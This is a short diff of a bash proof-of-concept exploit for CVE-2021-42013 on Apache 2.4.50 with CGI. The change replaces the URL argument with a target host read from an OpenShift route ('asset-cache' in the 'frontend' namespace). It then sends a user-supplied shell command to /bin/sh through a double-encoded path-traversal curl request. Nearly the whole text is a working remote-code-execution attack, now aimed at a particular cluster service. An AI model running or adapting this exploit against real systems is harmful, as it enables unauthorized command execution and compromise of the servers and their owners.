@@ -10,9 +10,13 @@
 #!/bin/bash
 
 echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
+
+target=$(oc -n frontend get route/asset-cache --output jsonpath={.spec.host})
+
 if [ $# -eq 0 ]
 then
-echo  "try: ./$0 http://ip:port"
+echo  "try: ./$0 id"
 exit 1
 fi
-curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
+
+curl "$target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $1"
